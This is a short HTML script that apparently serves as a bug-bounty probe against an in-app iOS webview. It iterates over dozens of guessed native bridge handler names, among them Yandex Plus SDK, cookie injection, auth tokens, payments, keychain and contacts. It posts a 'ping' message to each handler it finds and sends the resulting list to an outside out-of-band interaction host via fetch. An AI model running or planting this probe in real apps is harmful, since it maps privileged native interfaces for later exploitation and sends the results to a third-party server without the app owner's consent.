<script>
  var handlers = [
    "plus", "plusSDK", "YandexPlus", "YaPlusSDK", "sdk",
    "native", "nativeCall", "bridge", "app", "appBridge",
    "smartWebview", "SmartWebview", "webview", "WebView",
    "cookie", "cookieInject", "CookieInject",
    "broadcast", "Broadcasting", "message", "messaging",
    "contacts", "ContactsSelect", "contactsSelect",
    "navigation", "navigate", "close", "back",
    "payment", "pay", "fintech", "bank",
    "auth", "token", "session", "getToken",
    "device", "deviceInfo", "analytics", "log",
    "storage", "keychain", "biometric",
    "vibrate", "haptic",
    "camera", "photo", "gallery",
    "share", "clipboard",
    "openURL", "openUrl", "deeplink"
  ];

  var found = [];
  handlers.forEach(function(h){
    try {
      if(window.webkit.messageHandlers[h]){
        found.push(h);
        // Try to call it
        window.webkit.messageHandlers[h].postMessage({action:"ping"});
      }
    } catch(e){
      // If it throws TypeError "undefined" = doesn't exist
      // If it throws anything ELSE = it EXISTS but rejected our message
      if(e.name !== "TypeError") found.push(h + " (exists, error: " + e.message + ")");
    }
  });

  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bridges?" + encodeURIComponent(JSON.stringify(found)));
  document.title = "Found: " + JSON.stringify(found);
  </script>
